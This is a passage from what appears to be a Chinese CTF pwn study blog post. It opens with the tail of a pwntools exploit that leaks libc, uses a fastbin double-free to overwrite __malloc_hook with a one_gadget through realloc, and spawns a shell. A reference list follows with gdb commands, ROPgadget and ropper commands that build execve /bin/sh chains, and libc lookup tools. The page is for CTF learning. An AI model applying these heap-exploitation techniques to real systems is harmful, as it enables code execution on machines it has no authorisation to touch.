attach<span class="token punctuation">(</span>client<span class="token punctuation">.</span>client<span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc_action/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
gdb_offset <span class="token operator">=</span> <span class="token number">88</span>
<span class="token comment"># 通过gdb调试看main_arena对应libc的多少</span>
<span class="token comment"># unsortedbin</span>
<span class="token comment"># all: 0xd2a000 —▸ 0x7fa4e3b55b78 (main_arena+88) ◂— 0xd2a000</span>
main_arena_malloc_hook_offset <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x10</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> gdb_offset <span class="token operator">+</span> \
    main_arena_malloc_hook_offset <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>f<span class="token string">'libc: {hex(libc_base)}'</span><span class="token punctuation">)</span>

<span class="token comment"># fastbin attack</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># double-free A 使得A上伪造的地址被用上</span>
libc_0x7f_pos <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x23</span>
<span class="token comment"># 重新申请回A使得A.fd == libc_base + libc_0x7f_pos</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span> data<span class="token operator">=</span>p00<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc_0x7f_pos<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'abitrary'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'abitrary'</span><span class="token punctuation">)</span>  <span class="token comment"># 获取libc上伪造的堆</span>

one <span class="token operator">=</span> <span class="token number">0xf1247</span>
<span class="token comment"># 不考虑栈环境的</span>
<span class="token comment"># add(0x60, b'AAA' + p64(0) * 2 + p64(libc_base + one))</span>
<span class="token comment"># 考虑栈环境的</span>
<span class="token comment"># __GI___libc_realloc开始用于修改栈位置</span>
try_offset <span class="token operator">=</span> POP_OFFSET  <span class="token comment"># 0 2 4 6 8 11 12</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span> data<span class="token operator">=</span>b<span class="token string">'AAA'</span> <span class="token operator">+</span> p00<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1</span> <span class="token operator">+</span> p00<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> one<span class="token punctuation">)</span> <span class="token operator">+</span>
    p00<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span> <span class="token operator">+</span> try_offset<span class="token punctuation">)</span><span class="token punctuation">)</span>


sla<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">'Size:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h3><a id="_1737"></a>参考文档</h3> 
<ul><li> <p>常见知识点</p> 
  <ul><li> <p>汇编</p> <p><code>leave</code> equal <code>mov esp,ebp; pop ebp;</code></p> <p><code>ret</code> equal <code>pop eip</code></p> </li><li> <p>函数参数</p> 
    <ul><li> <p>x86函数传参：直接从栈上读，且参数在返回地址上方</p> <p><strong>栈的执行顺序</strong> ebp+(func1+f1_返回+f1_args)+(func2+f2_返回+f2_args)…</p> <p>syscall的话则需要寄存器传参：ebx,ecx,edx,esi,edi,ebp</p> </li><li> <p>x64函数传参：按 rdi, rsi, rdx, rcx, r8, r9顺序读，后续的从栈上读</p> <p>故x64需要调用ROP实现pop将参数从栈中传入寄存器</p> <p>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</p> </li></ul> </li><li> <p>ret2libc注意事项</p> 
    <ul><li>当题目没有设置setbuf的时候，不要用plt.printf，否则不会有回显</li><li>注意有时候远程打不通的时候，可能是因为栈没有平衡，找一个ret走一下可能就好了。</li></ul> </li><li> <p>gdb/pwndb</p> 
    <ul><li> <p>内存查看</p> 
      <ul><li>p expresion 查看指定数值 /print</li><li>x 查看各类 
        <ul><li>x/20g address 查数据 /global</li><li>x/20i address 查反汇编 /</li><li>x/20s address 查字符串 /strings</li><li>x/20b address 查字节 /bytes</li></ul> </li><li>hex查看hex及ascii<code>hex address size</code></li><li>i r 查注册表 /inspect register</li></ul> </li><li> <p>vmmap 内存查看</p> </li><li> <p>调试</p> 
      <ul><li>ni/下一步 si/进入 c/继续</li><li>b addr/断点 e addr/enable断点 d/disable断点 q/退出</li><li>set expression=xxx 设置内存</li></ul> </li></ul> </li></ul> </li><li> <p>常用工具</p> 
  <ul><li>pwntools逆向python库</li><li> 
    <ul><li><a href="https://zhuanlan.zhihu.com/p/83373740" rel="nofollow">工具的基本使用方法</a>，注意安装要使用<code>pip install pwntools</code></li><li><a href="http://docs.pwntools.com/en/latest/" rel="nofollow">官方文档</a></li><li><a href="https://github.com/Gallopsled/pwntools-tutorial#readme">官方使用教程</a></li></ul> </li><li>Kali 
    <ul><li>checksec：检查样本的基 本信息也可以是通过设置 pwntool.context.log_level = 'debug’得到</li><li>ROPgadget/ropper：检查文件中可以利用的<code>gadget</code>或<code>rop-chain</code> 
      <ul><li>静态编译的题基本上都是可以一键生成ropchain的，ropper -f flower --chain “execve cmd=/bin/sh”</li><li>注意在<code>python3</code>版本中，生成的chain需要在所有的字符串前面加上<code>b</code>表示十六进制值，否则会出现<code>str</code>不能合并<code>bytes</code>的报错</li></ul> </li><li>gdb：程序动态调试工具，也可以直接使用<a href="https://blog.csdn.net/m0_37157335/article/details/124091097">ida的远程调试功能</a></li></ul> </li><li>libc_searcher：用于retlibc题时候查询其libc版本 
    <ul><li>在线web查询 <a href="https://libc.rip/" rel="nofollow">推荐的查询器</a> <a href="https://libc.blukat.me/" rel="nofollow">稍菜一点的查询器</a></li><li>离线python <code>pip install sgtlibc</code> ，使用 sgtlibc ./binary_file func_name:addr func2_name:addr… --dump binsh</li><li>docker部署离线外部查询环境 <code>docker pull libcyber/srpnode</code>注意需要更新</li></ul> </li></ul> </li><li> <p>教程</p> 
  <ul><li><a href="https://www.bilibili.com/video/BV1mr4y1Y7fW" rel="nofollow">PWN全套讲解</a></li><li><a href="https://www.bilibili.com/video/BV1JV411m7PC?p=1" rel="nofollow">2019 北航 CTF Pwn入门培训课程（一）</a> 
    <ul><li>基础的rop使用方法</li></ul> </li><li><a href="https://www.bilibili.com/video/BV1JV411m7PC?p=2" rel="nofollow">2019 北航 CTF Pwn入门培训课程（二）</a> 
    <ul><li>为什么main的返回地址被替换为<code>system_addr</code>后 a=system_ret ;b=p aram_1 
      <ul><li>ret2libc使用pil节区中的<code>system</code>和<code>/bin/sh</code></li><li>如果没有的话就看其他函数的地址以查到libc版本，以及其各值的地址</li></ul> </li><li>如果是静态编译则使用int80调用rop链 
      <ul><li>ROPgadget 
        <ul><li>通过<code>ROPgadget --binary rop --ropchain</code>获取可以直接使用的rop链</li><li>通过<code>ROPgadget --binary rop --only "pop|ret"</code>获取可以存值的地方</li></ul> </li></ul> </li></ul> </li><li><a href="https://www.bilibili.com/video/BV1JV411m7PC?p=3" rel="nofollow">2019 北航 CTF Pwn入门培训课程（三）</a> 
    <ul><li>待解析</li></ul> </li><li><a href="https://www.bilibili.com/video/BV1JV411m7PC?p=4" rel="nofollow">2019 北航 CTF Pwn入门培训课程（四）</a> 
    <ul><li>待解析</li></ul> </li></ul> </li><li> <p>常见知识点</p> 
  <ul><li><a href="https://blog.csdn.net/weixin_43363675/article/details/117944212">[CTF pwn]傻傻分不清的execve、int80、syscall、system及shellcode</a></li><li><a href="https://blog.csdn.net/king13059595870/article/details/102647033">C 运算符重载</a></li></ul> </li></ul>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/1bbdb2e79449160ab776fd53061369d8/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">git报错 error: remote origin already exists.</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/afbb8e954713234688bbe59cc63522dd/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">达梦数据库定时备份</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>